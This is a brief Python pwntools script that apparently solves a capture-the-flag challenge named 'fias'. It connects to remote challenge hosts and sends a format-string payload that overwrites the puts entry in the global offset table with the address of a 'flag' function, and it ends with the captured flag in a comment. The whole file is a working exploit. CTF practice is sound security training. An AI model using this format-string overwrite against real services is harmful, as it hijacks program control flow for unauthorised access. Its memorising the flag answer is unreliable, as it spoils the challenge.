#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
debug = 1

if debug:
    #io = remote('88.198.219.20', 31360)
    io=remote('95.216.233.106',33280)
else:
    io = process(['./fias'])
binary = ELF('./fias')
flag = binary.symbols['flag']
# .got.plt puts address
puts = 0x0804c01c

payload  = b''
# 6 pointer to string buffer
payload += fmtstr_payload(6, {puts: flag})

io.recvuntil("Hi! What's your name? ")
io.sendline(payload)

io.interactive()
#ractf{St4ck_C4n4ry_FuN!}
